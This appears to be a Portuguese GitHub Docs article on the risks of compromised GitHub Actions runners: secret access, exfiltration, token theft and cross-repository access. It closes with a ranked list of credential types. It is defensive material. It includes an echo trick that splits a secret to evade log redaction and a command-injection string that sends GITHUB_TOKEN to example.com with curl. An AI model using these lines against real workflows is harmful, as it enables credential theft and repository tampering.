---
title: Executores comprometidos
description: Entenda os riscos de segurança associados a runners comprometidosGitHub Actions.
product: GitHub Actions
documentType: article
lang: pt-BR
plan: free-pro-team@latest
source: https://docs.github.com/pt/actions/concepts/security/compromised-runners
captured: '2026-10-11'
section: GitHub Actions
---

# Executores comprometidos

_Entenda os riscos de segurança associados a runners comprometidosGitHub Actions._

## Possível impacto de um executor comprometido

Estas seções abordam algumas das etapas que um invasor pode seguir caso consiga executar comandos maliciosos em um GitHub Actions runner.

> \[!NOTE]
> GitHubOs executores hospedados não verificam o código mal-intencionado baixado por um usuário durante o trabalho, como uma biblioteca de terceiros comprometida.

### Acessando segredos

Os fluxos de trabalho acionados a partir de um repositório bifurcado usando o evento `pull_request` têm permissões somente leitura e não têm acesso a segredos. No entanto, essas permissões são diferentes para vários gatilhos de evento, como `issue_comment`, `issues`, `push` e `pull_request` de uma ramificação no repositório, em que o invasor pode tentar roubar segredos do repositório ou usar a permissão de gravação do [`GITHUB_TOKEN`](github_token.md) do trabalho.

* Se o segredo ou o token for definido como uma variável de ambiente, ele poderá ser acessado diretamente por meio do ambiente com `printenv`.

* Se o segredo for usado diretamente em uma expressão, o script do shell gerado é armazenado em disco e é acessível.

* Para uma ação personalizada, o risco pode variar dependendo de como um programa está usando o segredo que obteve do argumento:

        ```yaml
  uses: fakeaction/publish@v3
  with:
      key: ${{ secrets.PUBLISH_KEY }}
  ```

Embora GitHub Actions remova da memória os segredos que não são referenciados no fluxo de trabalho (ou em uma ação incluída), o `GITHUB_TOKEN` e quaisquer segredos referenciados podem ser extraídos por um invasor determinado.

### Exfiltrar dados de um executor

Um invasor pode exfiltrar todos os segredos roubados ou outros dados do executor. Para ajudar a evitar a divulgação acidental de segredo, GitHub Actions[redigir automaticamente os segredos impressos no log](../../how-tos/write-workflows/choose-what-workflows-do/use-secrets.md), mas esse não é um verdadeiro limite de segurança porque os segredos podem ser enviados intencionalmente para o log. Por exemplo, segredos ofuscados podem ser exfiltrados por meio de `echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};`. Além disso, uma vez que o atacante pode executar comandos arbitrários, ele poderá usar solicitações HTTP para enviar segredos ou outros dados do repositório para um servidor externo.

### Roubo do `GITHUB_TOKEN` do trabalho

É possível que um invasor roube o `GITHUB_TOKEN` de um trabalho. O GitHub Actions runner recebe automaticamente um `GITHUB_TOKEN` gerado com permissões limitadas apenas ao repositório que contém o fluxo de trabalho, e o token expira após a conclusão do job. Uma vez expirado, o token não é mais útil para um invasor. Para resolver essa limitação, ele pode automatizar o ataque e executá-lo em frações de segundos chamando um servidor controlado pelo invasor com o token, por exemplo: `a"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#`

### Modificando os conteúdos de um repositório

O servidor invasor pode usar a API para modificar o GitHub[conteúdo do repositório](../../reference/workflows-and-actions/workflow-syntax.md#permissions), incluindo versões, se as permissões atribuídas `GITHUB_TOKEN`[](../../tutorials/authenticate-with-github_token.md#modifying-the-permissions-for-the-github_token).

### Acesso entre repositórios

GitHub Actions tem escopo intencionalmente limitado a um único repositório de cada vez. O `GITHUB_TOKEN` permite o mesmo nível de acesso que um usuário com acesso de gravação, porque qualquer usuário com acesso de gravação pode acessar esse token criando ou modificando um arquivo de fluxo de trabalho, elevando as permissões do `GITHUB_TOKEN` se necessário. Os usuários têm permissões específicas para cada repositório, portanto, permitir que um `GITHUB_TOKEN` repositório conceda acesso a outro afetará o GitHub modelo de permissão se não for implementado com cuidado. Da mesma forma, é necessário ter cuidado ao adicionar GitHub tokens de autenticação a um fluxo de trabalho, pois isso também pode afetar o GitHub modelo de permissão concedendo inadvertidamente amplo acesso aos colaboradores.

Se sua organização for de propriedade de uma conta corporativa, você poderá compartilhar e reutilizar GitHub Actions armazenando-os em repositórios internos. Para saber mais, confira [Compartilhando ações e fluxos de trabalho com sua empresa](../../how-tos/reuse-automations/share-with-your-enterprise.md).

Você pode executar outras interações privilegiadas entre repositórios fazendo referência a um GitHub token de autenticação ou chave SSH como um segredo dentro do fluxo de trabalho. Uma vez que muitos tipos de token de autenticação não permitem acesso granular a recursos específicos, há um risco significativo no uso do tipo incorreto de token, pois ele pode conceder acesso muito mais amplo do que o pretendido.

Esta lista descreve as abordagens recomendadas para acessar os dados do repositório dentro de um fluxo de trabalho, em ordem decrescente de preferência:

1. **O `GITHUB_TOKEN`**
   * Esse token tem o escopo intencionalmente definido para o repositório único que acionou o fluxo de trabalho e pode ter o mesmo nível de acesso que um usuário com permissão de gravação no repositório. O token é criado antes de cada trabalho começar e expira quando o trabalho é finalizado. Para saber mais, confira [Usar GITHUB\_TOKEN para autenticação em fluxos de trabalho](../../tutorials/authenticate-with-github_token.md).
   * O `GITHUB_TOKEN` deve ser usado sempre que possível.
2. **Chave de implantação do repositório**
   * Chaves de implantação são um dos únicos tipos de credenciais que concedem acesso de leitura ou gravação a um único repositório, e podem ser usadas para interagir com outro repositório dentro de um fluxo de trabalho. Para saber mais, confira [Gerenciar chaves de implantação](https://docs.github.com/pt/authentication/connecting-to-github-with-ssh/managing-deploy-keys#deploy-keys).
   * Observe que as chaves de implantação só podem clonar e fazer push para o repositório usando o Git, e não podem ser usada para interagir com a API REST ou o GraphQL. Portanto, elas podem não ser apropriadas para os suas necessidades.
3. \*\*
   GitHub App tokens\*\*
   * GitHub Apps pode ser instalado em repositórios selecionados e até mesmo ter permissões granulares nos recursos dentro deles. Você pode criar um GitHub App interno para sua organização, instalá-lo nos repositórios aos quais você precisa acessar dentro de seu fluxo de trabalho e autenticar-se como a instalação em seu fluxo de trabalho para acessar esses repositórios. Para saber mais, confira [Fazer solicitações de API autenticadas com um aplicativo GitHub em um fluxo de trabalho GitHub Actions](https://docs.github.com/pt/apps/creating-github-apps/authenticating-with-a-github-app/making-authenticated-api-requests-with-a-github-app-in-a-github-actions-workflow).
4. \*\*
   personal access tokens\*\*
   * Você nunca deve usar um personal access token (classic). Esses tokens concedem acesso a todos os repositórios nas organizações às quais você tem acesso, bem como a todos os repositórios pessoais na sua conta pessoal. Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho.
   * Se você usar um personal access token, nunca deverá usar um personal access token da sua própria conta. Se você deixar uma organização mais adiante, os fluxos de trabalho que usam este token falharão imediatamente e a depuração deste problema pode ser difícil. Em vez disso, você deve usar uma fine-grained personal access token nova conta que pertença à sua organização e que tenha acesso somente aos repositórios específicos necessários para o fluxo de trabalho. Observe que esta abordagem não é escalável e deve ser evitada em detrimento de alternativas, como as chaves de implantação.
5. **Chaves SSH em uma conta pessoal**
   * Os fluxos de trabalho nunca devem usar as chaves SSH em uma conta pessoal. Semelhante a personal access tokens (classic), eles concedem permissões de leitura/gravação a todos os seus repositórios pessoais, bem como a todos os repositórios aos quais você tem acesso por meio da associação à organização. Isto concede indiretamente amplo acesso a todos os usuários com acesso de gravação do repositório no qual se encontra o fluxo de trabalho. Se você pretende usar uma chave SSH apenas para realizar clones ou pushes de repositórios, e não precisa interagir com APIs públicas, deverá usar chaves de implantação individuais.

## Próximas etapas

Para obter as práticas recomendadas de segurança com GitHub Actions, consulte [Referência de uso seguro](../../reference/security/secure-use.md).
